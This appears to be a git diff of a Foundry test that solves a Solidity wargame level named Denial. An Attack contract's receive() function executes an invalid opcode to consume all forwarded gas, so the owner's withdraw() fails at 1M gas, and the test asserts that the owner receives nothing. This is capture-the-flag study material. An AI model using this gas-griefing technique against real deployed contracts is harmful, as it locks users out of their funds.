@@ -10,8 +10,8 @@ import "../src/Denial.sol";
 // If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, 
 // and the transaction is of 1M gas or less) you will win this level.
 
-
 /// @custom:lesson-learned
+// low level "call" is bad and malicious users can drain out all the gas with infinite loops or opcodes
 
 contract Attack {
 
@@ -20,12 +20,10 @@ contract Attack {
     }
 
     receive() external payable {
-      console.log("here");
       assembly {
         invalid()
       }
     }
-
 }
 
 
@@ -39,19 +37,22 @@ contract DenialSolvedTest is Test {
     s_user = payable(vm.addr(1));
     s_denial = new Denial();
     s_attack = new Attack();
+    vm.deal(address(s_denial), 10 ether);
+    vm.deal(address(this), 1 ether);
   }
 
   function testWinCondition() public {
 
-
-    vm.prank(s_user);
     s_attack.attack(s_denial);
 
-    vm.expectRevert();
-    (bool success, ) = address(s_denial).call(abi.encodeWithSignature("withdraw()"));
+    console.log(address(s_attack).balance, "partner");
+    console.log(address(s_denial.owner()).balance, "owner");
 
-    // s_denial.withdraw();
+    // 1-4M gas will run out. 5M+ will not
+    (bool success, ) = address(s_denial).call{gas: 1000000}(abi.encodeWithSignature("withdraw()"));
+
+    console.log(address(s_attack).balance, "partner");
+    console.log(address(s_denial.owner()).balance, "owner");
+    assertEq(s_denial.owner().balance, 0);
   }
-
- 
 }
